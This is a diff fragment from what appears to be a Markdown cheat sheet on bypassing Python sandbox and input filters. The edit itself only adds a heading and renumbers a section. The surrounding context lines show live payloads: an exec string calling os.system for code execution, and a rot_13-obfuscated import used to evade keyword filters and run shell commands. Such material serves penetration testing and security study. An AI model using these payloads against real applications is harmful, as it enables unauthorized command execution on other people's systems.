@@ -36,6 +36,8 @@ Nested_str = " This is string0 'string1 \" and string2 \' and string3 \' \" and 
 
 ## 1. Bypass - Forbidden characters or input validation
 
+### Encoding to byte code
+
 * We can encode forbidden characters in their encoded form. Here we used hex encoded as it works smoothly as compared to octal encoding.
 * Target command
   * `exec("print('RCE'); __import__('os').system('ls')")`
@@ -59,8 +61,8 @@ Nested_str = " This is string0 'string1 \" and string2 \' and string3 \' \" and 
   * Evasion3 command
     * `f3ck = __import__("pbzznaqf".decode('rot_13'))` 
     * `print f3ck.getoutput('ifconfig')`
-* * 
-## Restricted system modules 
+
+## 2. Restricted system modules 
 
 * You can perform a task in multiple ways, below is a list of all different ways used to perform the same action.
 * [https://www.python-course.eu/os\_module\_shell.php](https://www.python-course.eu/os_module_shell.php)
